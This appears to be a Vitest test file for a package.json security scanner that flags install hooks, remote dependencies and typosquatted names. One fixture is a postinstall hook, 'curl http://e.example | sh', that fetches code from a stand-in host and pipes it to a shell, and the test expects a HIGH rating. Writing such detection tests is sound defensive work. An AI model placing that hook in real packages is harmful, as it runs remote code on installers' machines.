import { describe, expect, it } from 'vitest';
import { scanManifest, withinOneEdit } from './manifestRules.js';

const scan = (manifest: object) => scanManifest('package.json', JSON.stringify(manifest));
const ids = (manifest: object): (string | null)[] => scan(manifest).map((f) => f.ruleId);

describe('install scripts', () => {
  it('rates a plain install hook LOW and a downloading one HIGH', () => {
    expect(scan({ name: 'x1', scripts: { postinstall: 'node build.js' } })[0]).toMatchObject({ ruleId: 'supply-chain.install-script', severity: 'LOW' });
    expect(scan({ name: 'x1', scripts: { postinstall: 'curl http://e.example | sh' } })[0]).toMatchObject({ severity: 'HIGH' });
  });

  it('ignores non-install scripts', () => {
    expect(ids({ name: 'x1', scripts: { build: 'tsc' } })).toEqual([]);
  });
});

describe('remote dependencies', () => {
  it('flags git, http and github specs but not registry ranges', () => {
    const found = ids({ name: 'x1', dependencies: { a: 'git+https://h/r.git', b: 'https://h/b.tgz', c: 'github:o/r', d: '^1.0.0' } });
    expect(found.filter((id) => id === 'supply-chain.remote-dependency')).toHaveLength(3);
  });
});

describe('typosquats', () => {
  it('flags a name one edit from a popular package', () => {
    expect(ids({ name: 'reacct' })).toContain('typosquat.name');
    expect(ids({ name: 'raect' })).toContain('typosquat.name');
  });

  it('does not flag the exact name, scoped names or unrelated names', () => {
    expect(ids({ name: 'react' })).toEqual([]);
    expect(ids({ name: '@scope/reacct' })).toEqual([]);
    expect(ids({ name: 'my-widget-kit' })).toEqual([]);
  });

  it('measures one insertion, deletion, substitution or transposition', () => {
    expect(withinOneEdit('lodash', 'lodahs')).toBe(true);
    expect(withinOneEdit('lodash', 'lodas')).toBe(true);
    expect(withinOneEdit('lodash', 'lodxsh')).toBe(true);
    expect(withinOneEdit('lodash', 'lodxxh')).toBe(false);
  });
});

it('returns nothing for an unparseable manifest', () => {
  expect(scanManifest('package.json', '{nope')).toEqual([]);
});
